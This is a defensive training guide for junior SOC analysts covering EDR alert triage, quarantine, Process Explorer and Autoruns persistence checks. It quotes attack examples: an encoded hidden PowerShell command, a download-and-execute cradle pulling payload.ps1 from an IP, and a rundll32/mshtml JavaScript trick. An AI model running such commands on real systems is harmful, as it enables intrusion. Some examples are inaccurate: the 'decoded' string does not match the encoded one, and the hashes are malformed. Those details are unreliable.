ğŸ§  1ï¸âƒ£ EDR ALERT FIRES â€” WHAT IT MEANS & WHAT INFO YOU GET

ğŸ§  WHAT IS AN EDR ALERT (PLAIN ENGLISH)
An EDR alert means
â¡ï¸ The EDR agent on the endpoint observed an action
â¡ï¸ That action matched a rule / ML behavior / IOC / anomaly
â¡ï¸ EDR is saying â€œHey, look at thisâ€, not â€œThis is 100% malwareâ€
âš  Important
EDR alert â‰  confirmed incident
EDR alert = starting point of investigation

ğŸ§  WHERE YOU SEE THE ALERT
Inside EDR console under
â€¢ Alerts
â€¢ Detections
â€¢ Incidents
â€¢ Threat activity
(Names differ by vendor but content is similar)

ğŸ§  WHAT INFORMATION IS AVAILABLE IN AN EDR ALERT
Think of the alert as 6 big blocks of info
1ï¸âƒ£ Alert metadata
2ï¸âƒ£ Host details
3ï¸âƒ£ User context
4ï¸âƒ£ Process details
5ï¸âƒ£ File details
6ï¸âƒ£ Network hint
Weâ€™ll go one by one with realistic examples

ğŸ§  1ï¸âƒ£ ALERT METADATA (WHY EDR SCREAMED)
ğŸ”¹ Fields you see
Alert Name
Severity
Detection Type
Timestamp
Confidence / Score


ğŸŸ¢ LEGIT EXAMPLE
Alert Name: PowerShell Script Block Logged
Severity: Low
Detection Type: Informational
Timestamp: 2025-01-12 10:05:12

ğŸ” Why this is likely legit
â€¢ Low severity
â€¢ Informational
â€¢ Common in admin systems

ğŸ”´ RED FLAG EXAMPLE
Alert Name: Suspicious PowerShell Execution
Severity: High
Detection Type: Behavioral
Timestamp: 2025-01-12 10:21:33
Confidence: 92%

ğŸš© Why this matters
â€¢ High severity
â€¢ Behavioral (not signature)
â€¢ High confidence
â€¢ Requires investigation

ğŸ§  2ï¸âƒ£ HOST DETAILS â€” WHICH MACHINE IS INVOLVED
ğŸ”¹ Fields you see
Hostname
IP Address
OS
Domain
Sensor Status


ğŸŸ¢ LEGIT EXAMPLE
Host: IT-ADMIN-VM01
OS: Windows Server 2019
IP: 10.0.1.10
Sensor: Healthy

Why likely legit
â€¢ Admin server
â€¢ Expected PowerShell usage

ğŸ”´ RED FLAG EXAMPLE
Host: LAPTOP-7KD93F
OS: Windows 10
IP: 192.168.1.45
Sensor: Healthy

Why interesting
â€¢ End-user laptop
â€¢ PowerShell rarely needed
â€¢ Higher risk

ğŸ§  3ï¸âƒ£ USER CONTEXT â€” WHO WAS LOGGED IN
ğŸ”¹ Fields you see
Username
Domain
Privilege Level
Session Type


ğŸŸ¢ LEGIT EXAMPLE
User: CORP\svc_backup
Privilege: Service Account
Session: Non-interactive

Why likely legit
â€¢ Service account
â€¢ Background task

ğŸ”´ RED FLAG EXAMPLE
User: CORP\gagan
Privilege: Standard User
Session: Interactive

Why suspicious
â€¢ Normal user
â€¢ Interactive login
â€¢ Malware often runs under user context

ğŸ§  4ï¸âƒ£ PROCESS DETAILS â€” WHAT ACTUALLY RAN
This is MOST IMPORTANT SECTION

ğŸ”¹ Fields you see
Process Name
Process Path
Parent Process
Process ID
Command Line


ğŸŸ¢ LEGIT PROCESS EXAMPLE
Process Name: powershell.exe
Process Path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Parent Process:
C:\Windows\System32\services.exe

Command Line:
powershell.exe -File C:\Scripts\Backup.ps1

Why legit
âœ” Correct path
âœ” Clear script path
âœ” No obfuscation
âœ” System parent

ğŸ”´ RED FLAG PROCESS EXAMPLE
Process Name: powershell.exe
Process Path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Parent Process:
C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE

Command Line:
powershell.exe -nop -w hidden -enc SQBFAFgA

ğŸš© Why suspicious
â€¢ Spawned by Word
â€¢ Hidden window
â€¢ Encoded command
â€¢ No visible script
This screams
â¡ï¸ phishing document â†’ payload execution

ğŸ§  5ï¸âƒ£ FILE DETAILS â€” WHAT BINARY OR SCRIPT
ğŸ”¹ Fields you see
File Name
File Path
File Hash
Signature
First Seen


ğŸŸ¢ LEGIT FILE EXAMPLE
File Name: chrome.exe
File Path:
C:\Program Files\Google\Chrome\Application\chrome.exe

SHA256: Known
Signature: Google LLC
First Seen: 2020

âœ” Trusted vendor
âœ” Program Files path

ğŸ”´ RED FLAG FILE EXAMPLE
File Name: update.exe
File Path:
C:\Users\Gagan\AppData\Roaming\update.exe

SHA256: Unknown
Signature: Unsigned
First Seen: Today

ğŸš© Why malicious
â€¢ AppData path
â€¢ Unsigned
â€¢ New file
â€¢ Generic name

ğŸ§  6ï¸âƒ£ NETWORK HINT â€” DID IT TALK OUT
EDR often shows summary, not full PCAP

ğŸŸ¢ LEGIT NETWORK EXAMPLE
Process: chrome.exe
Domain: google.com
Port: 443

âœ” Expected behavior

ğŸ”´ RED FLAG NETWORK EXAMPLE
Process: powershell.exe
DNS Query: update-checker.xyz
Destination IP: 185.231.154.22
Port: 443

ğŸš© Why suspicious
â€¢ PowerShell making network calls
â€¢ Random domain
â€¢ Unknown IP

ğŸ§  WHAT YOU SHOULD THINK AS A JUNIOR AT THIS STAGE
âœ” Do I see user writable paths
âœ” Do I see LOLBins with bad flags
âœ” Do I see Office â†’ Script execution
âœ” Do I see external network access
If YES to multiple
â¡ï¸ This alert deserves deep investigation

ğŸ§  WHAT YOU SHOULD NOT DO YET
âŒ Do NOT close alert
âŒ Do NOT mark as malware immediately
âŒ Do NOT delete files manually
You have only observed, not confirmed

ğŸ§  2ï¸âƒ£ ANALYZE HASH + PATH + PROCESS + COMMAND LINE + NETWORK
(THIS IS WHERE 80% OF MALWARE IS CONFIRMED)
At this stage
â¡ï¸ You already have an EDR alert
â¡ï¸ Now you prove whether it is legit activity or malicious

ğŸ§  A. FILE HASH ANALYSIS (IDENTITY CHECK)

ğŸ”¹ WHAT IS A FILE HASH (JUNIOR LEVEL)
A hash is like a fingerprint of a file
Same file = same hash
If attacker modifies even 1 byte = hash changes
EDR calculates hash when the file is written or executed

ğŸ”¹ WHERE YOU SEE HASH
In EDR alert â†’ File details section
Example field names
â€¢ SHA256
â€¢ File hash
â€¢ IOC hash

ğŸŸ¢ LEGIT HASH EXAMPLE (REALISTIC)
File Name: chrome.exe
File Path:
C:\Program Files\Google\Chrome\Application\chrome.exe

SHA256:
a4c3f9c8e8b7d1c5d23f7a9e2c4d8b9f2a1e3c4d5f6a7b8c9d0e1f2a3b4c5
VirusTotal: 0/70
First Seen: 2019
Signed: Google LLC

WHY THIS IS LEGIT
âœ” Program Files path
âœ” Signed by trusted vendor
âœ” Seen for years
âœ” No detections
â¡ï¸ Hash alone says safe

ğŸ”´ RED FLAG HASH EXAMPLE
File Name: update.exe
File Path:
C:\Users\Gagan\AppData\Roaming\update.exe

SHA256:
9f3a12c88b77e6c5d4e3a1b9c8d7e6f5a4b3c2d1e9f8a7b6c5d4e3f2a1b
VirusTotal: 17/70
First Seen: Today
Signed: Unsigned

WHY THIS IS MALICIOUS
âŒ AppData path (user writable)
âŒ Generic filename
âŒ Unsigned
âŒ AV detections
âŒ First seen today
â¡ï¸ Even without behavior, this is high confidence malware

ğŸ”¹ IMPORTANT JUNIOR RULE
âš ï¸ A clean hash does NOT mean safe
If hash is new â†’ rely on path + behavior

ğŸ§  B. FILE PATH ANALYSIS (MOST IMPORTANT FOR JUNIORS)

ğŸ”¹ WHY FILE PATH IS CRITICAL
Windows protects system directories
Attackers cannot easily write there
So malware hides in user-writable paths

ğŸŸ¢ LEGIT EXECUTION PATHS
C:\Windows\System32\
C:\Windows\SysWOW64\
C:\Program Files\
C:\Program Files (x86)\

Legit example
Process: svchost.exe
Path:
C:\Windows\System32\svchost.exe

âœ” Correct name
âœ” Correct directory

ğŸ”´ RED FLAG EXECUTION PATHS
C:\Users\<user>\AppData\Local\Temp\
C:\Users\<user>\AppData\Roaming\
C:\Users\Public\
C:\ProgramData\

Malicious example
Process: svchost.exe
Path:
C:\Users\Gagan\AppData\Roaming\svchost.exe

WHY THIS IS MALICIOUS
âŒ svchost is a core Windows process
âŒ It never runs from AppData
âŒ Attacker copied name to look legit
â¡ï¸ This alone is enough to mark malicious

ğŸ”¹ COMMON MALWARE FAKE NAMES
update.exe
svhost.exe
runtime.exe
winupdate.exe

ğŸ§  C. PROCESS ANALYSIS (WHAT ACTUALLY RAN)

ğŸ”¹ WHAT IS A PROCESS
A process is a running executable in memory
EDR shows
â€¢ Process name
â€¢ PID
â€¢ Parent PID

ğŸŸ¢ LEGIT PROCESS EXAMPLE
Process Name: powershell.exe
Path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Parent Process:
services.exe

Command Line:
powershell.exe -File C:\Scripts\Inventory.ps1

WHY LEGIT
âœ” Clear script path
âœ” No obfuscation
âœ” System parent
âœ” Expected admin usage

ğŸ”´ RED FLAG PROCESS EXAMPLE
Process Name: powershell.exe
Path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Parent Process:
WINWORD.EXE

Command Line:
powershell.exe -nop -w hidden -enc SQBFAFgA

WHY THIS IS MALICIOUS
âŒ Office spawning PowerShell
âŒ Hidden window
âŒ Encoded payload
âŒ No visible script
â¡ï¸ Classic phishing execution

ğŸ§  D. COMMAND LINE ANALYSIS (ATTACKER INTENT)

ğŸ”¹ WHY COMMAND LINE IS GOLD
It shows
â€¢ What attacker is trying to do
â€¢ Whether payload is hidden
â€¢ Whether network download happens

ğŸ”´ MALICIOUS COMMAND LINE (REALISTIC)
powershell.exe -nop -w hidden -enc SQBFAFgA


ğŸ”¹ DECODE IT (HOW)
Run on analyst machine:
[System.Text.Encoding]::Unicode.GetString(
[System.Convert]::FromBase64String("SQBFAFgA")
)


ğŸ”´ DECODED RESULT
IEX(New-Object Net.WebClient).DownloadString('http://185.231.154.22/payload.ps1')

WHY THIS IS MALICIOUS
âŒ Downloads script from internet
âŒ Executes in memory
âŒ No file written (fileless)

ğŸŸ¢ LEGIT COMMAND LINE EXAMPLE
powershell.exe -File C:\Windows\System32\Tasks\Backup.ps1

âœ” No encoding
âœ” Clear file path
âœ” Known purpose

ğŸ”¹ COMMON MALICIOUS FLAGS (JUNIOR MUST MEMORIZE)
-nop
-enc
-w hidden
-bypass
ExecutionPolicy Bypass

ğŸ§  E. NETWORK ANALYSIS (C2 CONFIRMATION)

ğŸ”¹ WHAT NETWORK DATA EDR SHOWS
â€¢ DNS query
â€¢ Destination IP
â€¢ Port
â€¢ Process name

ğŸŸ¢ LEGIT NETWORK EXAMPLE
Process: chrome.exe
DNS: google.com
IP: 142.250.195.46
Port: 443

âœ” Browser activity
âœ” Trusted domain

ğŸ”´ RED FLAG DNS EXAMPLE
Process: powershell.exe
DNS Query: update-checker.xyz

WHY SUSPICIOUS
âŒ PowerShell normally doesnâ€™t browse
âŒ Random domain name
âŒ New TLD

ğŸ”´ RED FLAG IP EXAMPLE
Destination IP: 185.231.154.22
Port: 443
Country: Unknown / High risk
ASN: Hosting provider

WHY MALICIOUS
âŒ Not CDN
âŒ Not vendor IP
âŒ PowerShell talking outbound

ğŸ”¹ WHAT YOU CHECK (HOW)
â€¢ WHOIS lookup
â€¢ Domain age
â€¢ Threat intel feeds
â€¢ EDR reputation score

ğŸ§  STEP 2 â€” FINAL JUNIOR CONCLUSION LOGIC
You combine ALL signals, not just one

ğŸ”´ CONFIRMED MALICIOUS IF
âœ” User-writable path
âœ” LOLBin abuse
âœ” Encoded command
âœ” External network
âœ” Unknown or bad hash

ğŸŸ¢ LIKELY LEGIT IF
âœ” System path
âœ” Signed binary
âœ” Clear command line
âœ” Expected parent
âœ” Known domain

ğŸ§  WHAT YOU SHOULD WRITE IN TICKET (IMPORTANT)
ğŸ’¬
â€œAnalysis of hash, execution path, parent-child process chain, command-line arguments, and network indicators shows suspicious behavior consistent with phishing-based PowerShell execution. Further containment and remediation required.â€



ğŸ§  3ï¸âƒ£ EDR QUARANTINE OR CONTAINMENT
WHAT HAPPENS, HOW IT LOOKS, WHAT YOU MUST STILL CHECK

ğŸ§  FIRST â€” CLEAR DEFINITIONS (NO CONFUSION)
ğŸ”¹ QUARANTINE
EDR removes or isolates the malicious file from the system
Think
â¡ï¸ â€œThat file is no longer usableâ€

ğŸ”¹ CONTAINMENT / ISOLATION
EDR cuts the endpointâ€™s network access
Think
â¡ï¸ â€œThis machine cannot talk to the networkâ€

âš  IMPORTANT
Quarantine â‰  containment
Containment â‰  cleanup
Neither guarantees the system is clean

ğŸ§  CASE A â€” EDR QUARANTINE SUCCESSFUL

ğŸ”¹ WHAT YOU SEE IN EDR (REALISTIC LOG)
Action Taken: Quarantine File
Status: Successful
Timestamp: 2025-01-12 10:23:10

File Name: update.exe
Original Path:
C:\Users\Gagan\AppData\Roaming\update.exe

New Path:
C:\ProgramData\EDR\Quarantine\QF_239847.update

Process Terminated: Yes
Hash Blocked Globally: Yes


ğŸ”¹ WHAT ACTUALLY HAPPENED (PLAIN ENGLISH)
âœ” File was moved to EDR quarantine folder
âœ” File permissions changed (cannot execute)
âœ” Running process was killed
âœ” Same hash blocked on other machines

ğŸ”¹ WHY THIS LOOKS GOOD (BUT IS NOT ENOUGH)
Junior mistake
â¡ï¸ â€œFile is quarantined, case closedâ€
âŒ WRONG
Because
â€¢ Persistence may already exist
â€¢ Memory-only payload may still be active
â€¢ Credentials may already be stolen

ğŸ”¹ LEGIT QUARANTINE EXAMPLE
File Name: test_eicar.com
Path:
C:\Users\Gagan\Downloads\eicar.txt

Reason:
Known test malware signature

Why legit
âœ” Known test file
âœ” User downloaded intentionally
âœ” No persistence
âœ” No suspicious behavior
â¡ï¸ You can close after validation

ğŸ”´ MALICIOUS QUARANTINE EXAMPLE
File Name: update.exe
Path:
C:\Users\Gagan\AppData\Roaming\update.exe
Parent Process:
WINWORD.EXE

Why still dangerous
âŒ File came from phishing
âŒ Executed already
âŒ Could have dropped persistence
â¡ï¸ Investigation MUST continue

ğŸ§  WHAT YOU MUST CHECK AFTER QUARANTINE
Even if quarantine says â€œsuccessfulâ€
You must still check
â€¢ Registry Run keys
â€¢ Scheduled tasks
â€¢ Services
â€¢ Running processes
â€¢ Network connections
(These come in Step 4 & 5)

ğŸ§  CASE B â€” EDR DETECTED BUT DID NOT QUARANTINE
This happens very often

ğŸ”¹ DETECT-ONLY LOG EXAMPLE
Action Taken: Detect Only
Reason: Fileless Execution
Detection Type: Behavioral


ğŸ”¹ WHAT THIS MEANS (JUNIOR LEVEL)
EDR saw malicious behavior
BUT
There is no file to quarantine
Example
â€¢ PowerShell
â€¢ mshta
â€¢ rundll32
â€¢ In-memory payload

ğŸ”´ REAL DETECT-ONLY EXAMPLE
Process Name: powershell.exe
Command Line:
powershell.exe -nop -w hidden -enc SQBFAFgA

File Written: No
Payload Type: In-memory

Why dangerous
âŒ Nothing removed
âŒ Malware may still be running
âŒ Persistence likely created

ğŸ§  WHAT YOU MUST DO IN DETECT-ONLY CASE
Junior rule
â¡ï¸ DETECT ONLY = MANUAL RESPONSE REQUIRED
You must
â€¢ Isolate the host
â€¢ Validate runtime processes
â€¢ Check persistence manually

ğŸ§  CASE C â€” HOST CONTAINMENT / ISOLATION

ğŸ”¹ CONTAINMENT LOG EXAMPLE
Action Taken: Host Isolated
Status: Successful
Timestamp: 2025-01-12 10:25:02

Network Access: Blocked
EDR Communication: Allowed


ğŸ”¹ WHAT THIS ACTUALLY DOES
âœ” Blocks all outbound traffic
âœ” Blocks lateral movement
âœ” Allows EDR to still communicate
âŒ Does NOT kill malware
âŒ Does NOT remove persistence

ğŸŸ¢ LEGIT ISOLATION EXAMPLE
Reason:
Suspicious admin tool execution during investigation

Used when
âœ” Analyst still investigating
âœ” No confirmation yet

ğŸ”´ MALICIOUS ISOLATION EXAMPLE
Reason:
Confirmed malware with C2 communication

Used when
âŒ Data exfil risk
âŒ Lateral movement risk

ğŸ§  WHAT CHANGES ON THE HOST (PATH & BEHAVIOR)

ğŸ”¹ BEFORE ISOLATION
powershell.exe â†’ 185.231.154.22:443


ğŸ”¹ AFTER ISOLATION
Connection blocked
Firewall rule applied by EDR

EDR log may show
Network action: Blocked by isolation policy


ğŸ§  COMMON JUNIOR MISTAKES IN STEP 3
âŒ Closing alert after quarantine
âŒ Assuming detect-only is safe
âŒ Thinking isolation cleans the system
âŒ Not checking persistence

ğŸ§  STEP 3 â€” WHAT YOU SHOULD CONCLUDE
At the end of Step 3 you should say:
ğŸ’¬
â€œEDR has either quarantined the file or detected fileless activity. Although immediate execution may be stopped or the host isolated, further validation is required to ensure no persistence, memory-resident malware, or follow-up activity exists.â€

ğŸ§  QUICK COMPARISON (MEMORIZE THIS)
Scenario
Is Malware Gone
Investigation Done
Quarantine only
âŒ No
âŒ No
Detect only
âŒ No
âŒ No
Isolation
âŒ No
âŒ No
Quarantine + validation
âœ” Yes
âœ” Yes



ğŸ§  4ï¸âƒ£ PROCESS EXPLORER â€” RUNTIME VALIDATION (LIVE SYSTEM CHECK)

ğŸ§  WHAT IS PROCESS EXPLORER (PLAIN ENGLISH)
Process Explorer is an advanced Task Manager from Microsoft Sysinternals.
Task Manager shows
 â€¢ process name
 â€¢ CPU / memory
Process Explorer shows
 â€¢ exact file path
 â€¢ parent â†’ child chain
 â€¢ command line
 â€¢ digital signature
 â€¢ loaded DLLs
 â€¢ network connections
â¡ï¸ This is what malware analysts actually use

ğŸ§  WHY THIS STEP IS CRITICAL (VERY IMPORTANT)
EDR tells you
 â€¢ what happened
 â€¢ what was detected
 â€¢ what was blocked
BUT
 EDR does NOT guarantee
 â€¢ process isnâ€™t still running
 â€¢ malware didnâ€™t rename itself
 â€¢ malware isnâ€™t injected into another process
Process Explorer answers
 ğŸ‘‰ what is running RIGHT NOW

ğŸ§  WHEN YOU MUST USE PROCESS EXPLORER
âœ” After EDR quarantine
 âœ” After detect-only alert
 âœ” Before closing incident
 âœ” Before reboot validation
If you skip this â†’ reinfection happens

ğŸ§  HOW TO OPEN PROCESS EXPLORER (STEP BY STEP)
1ï¸âƒ£ Download Sysinternals Process Explorer
 2ï¸âƒ£ Right-click â†’ Run as Administrator
Why admin
 â€¢ Needed to see system processes
 â€¢ Needed to inspect services
 â€¢ Needed to see injected DLLs

ğŸ§  MUST-ENABLE SETTINGS (JUNIOR MUST DO THIS)
Go to
 View â†’ Select Columns
Enable these columns ğŸ‘‡
âœ” Image Path
 âœ” Command Line
 âœ” Parent Process
 âœ” Verified Signer
 âœ” VirusTotal
Then
 Options â†’ Verify Image Signatures
 Options â†’ Check VirusTotal.com
This removes guesswork.

ğŸ§  HOW PROCESS TREE LOOKS (IMPORTANT)
Process Explorer shows a tree, not a list.
Example
explorer.exe
 â”œâ”€â”€ chrome.exe
 â”œâ”€â”€ winword.exe
 â”‚    â””â”€â”€ powershell.exe
 â”‚         â””â”€â”€ cmd.exe

â¡ï¸ This tree tells the execution story

ğŸ§  RUNTIME VALIDATION â€” WHAT TO CHECK (IN ORDER)

ğŸ§  1ï¸âƒ£ PROCESS NAME + IMAGE PATH (MOST IMPORTANT)

ğŸŸ¢ LEGIT PROCESS EXAMPLE
Process Name: svchost.exe
Image Path:
C:\Windows\System32\svchost.exe
Verified Signer: Microsoft Windows

WHY LEGIT
 âœ” Correct name
 âœ” Correct system path
 âœ” Microsoft signed
â¡ï¸ Normal Windows behavior

ğŸ”´ MALICIOUS PROCESS EXAMPLE (VERY COMMON)
Process Name: svchost.exe
Image Path:
C:\Users\Gagan\AppData\Roaming\svchost.exe
Verified Signer: Unable to verify

WHY MALICIOUS
 âŒ svchost NEVER runs from AppData
 âŒ User-writable path
 âŒ Unsigned
â¡ï¸ Masquerading malware
This alone is enough to escalate.

ğŸ”´ ANOTHER RED FLAG EXAMPLE
Process Name: runtime.exe
Image Path:
C:\Users\Public\runtime.exe
Signer: Unsigned

WHY MALICIOUS
 âŒ Generic name
 âŒ Public folder
 âŒ No vendor signature

ğŸ§  2ï¸âƒ£ PARENT â†’ CHILD PROCESS RELATIONSHIP
This tells how the process started

ğŸŸ¢ LEGIT PARENT-CHILD EXAMPLE
services.exe
 â””â”€â”€ svchost.exe

WHY LEGIT
 âœ” System spawning system process

ğŸ”´ MALICIOUS PARENT-CHILD EXAMPLE
WINWORD.EXE
 â””â”€â”€ powershell.exe

WHY MALICIOUS
 âŒ Office should not spawn PowerShell
 âŒ Strong phishing indicator
Another red flag
explorer.exe
 â””â”€â”€ mshta.exe


ğŸ§  3ï¸âƒ£ COMMAND LINE ANALYSIS (LIVE VIEW)
Right-click process â†’ Properties â†’ Image tab

ğŸŸ¢ LEGIT COMMAND LINE
powershell.exe -File C:\Scripts\Backup.ps1

WHY LEGIT
 âœ” Clear script path
 âœ” No obfuscation
 âœ” Expected admin behavior

ğŸ”´ MALICIOUS COMMAND LINE
powershell.exe -nop -w hidden -enc SQBFAFgA

WHY MALICIOUS
 âŒ Hidden execution
 âŒ Encoded payload
 âŒ No script file
â¡ï¸ Fileless malware likely

ğŸ”´ EVEN WORSE EXAMPLE
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write(...)

WHY MALICIOUS
 âŒ rundll32 abusing mshtml
 âŒ JavaScript execution
 âŒ Common malware trick

ğŸ§  4ï¸âƒ£ VERIFIED SIGNER (TRUST CHECK)
Process Explorer shows
 âœ” Microsoft
 âœ” Google
 âŒ Unable to verify

ğŸŸ¢ LEGIT SIGNATURE
Verified Signer: Microsoft Windows

WHY LEGIT
 âœ” OS binary
 âœ” Signed

ğŸ”´ MALICIOUS SIGNATURE
Verified Signer: Unsigned

WHY MALICIOUS
 âŒ No trust
 âŒ System-like name but unsigned
Unsigned + system name = ğŸš¨

ğŸ§  5ï¸âƒ£ VIRUSTOTAL SCORE (SUPPORTING EVIDENCE)
Process Explorer shows
VirusTotal: 15/70

WHY IMPORTANT
 âœ” Confirms known malware
 âœ” Helps junior confidence
âš  But remember
 0/70 â‰  safe if behavior is bad

ğŸ§  6ï¸âƒ£ NETWORK ACTIVITY (LIVE SOCKETS)
Double-click process â†’ TCP/IP tab

ğŸŸ¢ LEGIT NETWORK EXAMPLE
Process: chrome.exe
Remote Address: 142.250.195.46
Port: 443

WHY LEGIT
 âœ” Browser
 âœ” Google IP

ğŸ”´ MALICIOUS NETWORK EXAMPLE
Process: powershell.exe
Remote Address: 185.231.154.22
Port: 443
State: ESTABLISHED

WHY MALICIOUS
 âŒ PowerShell shouldnâ€™t talk externally
 âŒ Unknown IP
 âŒ Possible C2

ğŸ§  7ï¸âƒ£ LOADED DLLs (INJECTION CHECK)
Right-click process â†’ Properties â†’ DLLs tab

ğŸ”´ MALICIOUS DLL EXAMPLE
Loaded DLL:
C:\Users\Gagan\AppData\Roaming\evil.dll

WHY MALICIOUS
 âŒ DLL loaded from user path
 âŒ Process injection likely

ğŸ§  WHAT TO DO WHEN YOU FIND MALICIOUS PROCESS

ğŸ”¹ ACTIONS (SAFE ORDER)
1ï¸âƒ£ Suspend process (optional, analysis)
 2ï¸âƒ£ Kill process tree
 3ï¸âƒ£ Note PID & path
 4ï¸âƒ£ Jump to file location
 5ï¸âƒ£ Do NOT delete yet (persistence check next)

ğŸ§  COMMON JUNIOR MISTAKES IN PROCESS EXPLORER
âŒ Only checking process name
 âŒ Ignoring image path
 âŒ Trusting Task Manager
 âŒ Missing injected DLLs
 âŒ Closing incident without runtime check


ğŸ§  5ï¸âƒ£ AUTORUNS â€” PERSISTENCE VALIDATION (MOST CRITICAL STEP)

ğŸ§  WHAT IS PERSISTENCE (VERY SIMPLE)
Persistence means
â¡ï¸ How malware survives reboot, logoff, shutdown
If malware executed once but did not create persistence
â¡ï¸ Reboot = malware gone
If malware created persistence
â¡ï¸ Reboot = malware comes back
Thatâ€™s why Autoruns is mandatory

ğŸ§  WHAT IS AUTORUNS (PLAIN ENGLISH)
Autoruns shows EVERY place in Windows where programs can auto-start
Not just
â€¢ Startup folder
â€¢ Registry Run
But also
â€¢ Scheduled Tasks
â€¢ Services
â€¢ Drivers
â€¢ WMI
â€¢ Browser helpers
â¡ï¸ This is where attackers hide

ğŸ§  WHEN YOU MUST USE AUTORUNS
âœ” After EDR quarantine
âœ” After detect-only alerts
âœ” Before reboot validation
âœ” Before closing incident
If you skip Autoruns
â¡ï¸ reinfection is your fault (SOC reality)

ğŸ§  HOW TO OPEN AUTORUNS (STEP BY STEP)
1ï¸âƒ£ Download Sysinternals Autoruns
2ï¸âƒ£ Right-click â†’ Run as Administrator
Why admin
â€¢ Needed to see HKLM entries
â€¢ Needed to see services & drivers

ğŸ§  MUST-ENABLE SETTINGS (DO NOT SKIP)
Go to
Options
âœ” Hide Microsoft Entries
âœ” Verify Code Signatures
âœ” Scan VirusTotal
This removes 90% noise

ğŸ§  AUTORUNS COLOR MEANING (VERY IMPORTANT)
ğŸŸ¢ Normal white â†’ file exists & signed
ğŸŸ¡ Yellow â†’ entry exists but file missing
ğŸ”´ Pink/Red â†’ unsigned or suspicious
ğŸŸ¡ Yellow entries = forensic gold
Means malware removed file but persistence still exists

ğŸ§  PERSISTENCE LOCATIONS â€” ONE BY ONE (WITH REAL EXAMPLES)

ğŸ§  1ï¸âƒ£ REGISTRY RUN KEYS (MOST COMMON)

ğŸ“ PATH (USER LEVEL)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Runs when that user logs in

ğŸŸ¢ LEGIT EXAMPLE
Autoruns entry
Entry: OneDrive
Image Path:
C:\Program Files\Microsoft OneDrive\OneDrive.exe
Signer: Microsoft

WHY LEGIT
âœ” Program Files path
âœ” Known software
âœ” Signed

ğŸ”´ MALICIOUS EXAMPLE
Autoruns entry
Entry: Updater
Image Path:
C:\Users\Gagan\AppData\Roaming\update.exe
Signer: Unsigned

WHY MALICIOUS
âŒ AppData path
âŒ Generic name
âŒ Unsigned
âŒ Runs every login
â¡ï¸ This guarantees malware relaunch after reboot

ğŸ“ PATH (SYSTEM LEVEL)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Runs for all users

ğŸ”´ MALICIOUS SYSTEM RUN KEY
Entry: WindowsUpdate
Image Path:
C:\Users\Public\winupdate.exe

WHY MALICIOUS
âŒ Fake Microsoft name
âŒ Public folder
âŒ Runs for every user

ğŸ§  2ï¸âƒ£ STARTUP FOLDER (SIMPLE BUT STILL USED)

ğŸ“ PATH (USER)
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


ğŸŸ¢ LEGIT EXAMPLE
App: Microsoft Teams
Path:
C:\Program Files\Microsoft\Teams\current\Teams.exe


ğŸ”´ MALICIOUS EXAMPLE
File:
invoice.lnk
Target:
C:\Users\Gagan\AppData\Roaming\payload.exe

WHY MALICIOUS
âŒ LNK hiding payload
âŒ User writable path
âŒ Executes on login

ğŸ§  3ï¸âƒ£ SCHEDULED TASKS (VERY COMMON & STEALTHY)

ğŸ“ PATH
C:\Windows\System32\Tasks\

Shown in Autoruns â†’ Scheduled Tasks tab

ğŸŸ¢ LEGIT TASK EXAMPLE
Task Name: Adobe Acrobat Update Task
Action:
"C:\Program Files\Common Files\Adobe\ARM\AdobeARM.exe"
Trigger: Daily

WHY LEGIT
âœ” Vendor name
âœ” Program Files path
âœ” Clear purpose

ğŸ”´ MALICIOUS TASK EXAMPLE
Task Name: UpdateCheck
Action:
powershell.exe -nop -w hidden -enc SQBFAFgA
Trigger: At logon

WHY MALICIOUS
âŒ Encoded PowerShell
âŒ Hidden window
âŒ Runs every login
âŒ No vendor
â¡ï¸ Fileless persistence

ğŸ”´ EVEN WORSE EXAMPLE
Task Name: SystemMaintenance
Action:
C:\Users\Public\system.exe
Trigger: Every 5 minutes

WHY MALICIOUS
âŒ Fake system name
âŒ Public directory
âŒ High frequency

ğŸ§  4ï¸âƒ£ SERVICES (PERSISTENCE WITH HIGH PRIVILEGE)

ğŸ“ REGISTRY PATH
HKLM\SYSTEM\CurrentControlSet\Services

Shown in Autoruns â†’ Services tab

ğŸŸ¢ LEGIT SERVICE EXAMPLE
Service Name: Windows Defender Antivirus Service
Image Path:
C:\Windows\System32\MsMpEng.exe
Signer: Microsoft


ğŸ”´ MALICIOUS SERVICE EXAMPLE
Service Name: WindowsUpdateSvc
Image Path:
C:\Users\Public\winupdate.exe
Start Type: Auto
Signer: Unsigned

WHY MALICIOUS
âŒ Fake Microsoft name
âŒ User-writable path
âŒ Auto-start
âŒ High privilege
â¡ï¸ Full system compromise risk

ğŸ§  5ï¸âƒ£ WMI PERSISTENCE (ADVANCED, OFTEN MISSED)

ğŸ“ WHERE SHOWN
Autoruns â†’ WMI tab

ğŸ”´ MALICIOUS WMI EXAMPLE
Event Filter:
SELECT * FROM __InstanceCreationEvent
Command:
powershell.exe -enc SQBFAFgA

WHY MALICIOUS
âŒ Triggers silently
âŒ No file needed
âŒ Survives reboots
Most juniors miss this completely

ğŸ§  6ï¸âƒ£ DRIVER / BOOT PERSISTENCE (RARE BUT CRITICAL)

ğŸ“ LOCATION
Autoruns â†’ Drivers tab

ğŸ”´ MALICIOUS DRIVER EXAMPLE
Driver: winio.sys
Path:
C:\Users\Public\winio.sys
Signer: Unsigned

WHY MALICIOUS
âŒ Kernel-level
âŒ User directory
âŒ Extremely dangerous

ğŸ§  WHAT TO DO WHEN YOU FIND MALICIOUS PERSISTENCE

ğŸ”¹ SAFE ORDER (DO NOT RANDOMLY DELETE)
1ï¸âƒ£ Note entry name
2ï¸âƒ£ Note full image path
3ï¸âƒ£ Disable entry in Autoruns
4ï¸âƒ£ Reboot system
5ï¸âƒ£ Confirm entry does NOT return
6ï¸âƒ£ Delete file after confirmation

ğŸ§  COMMON JUNIOR MISTAKES IN AUTORUNS
âŒ Only checking Run keys
âŒ Ignoring Scheduled Tasks
âŒ Ignoring yellow entries
âŒ Deleting files before disabling persistence
âŒ Closing case without reboot test

ğŸ§  STEP 5 FINAL JUNIOR CONCLUSION
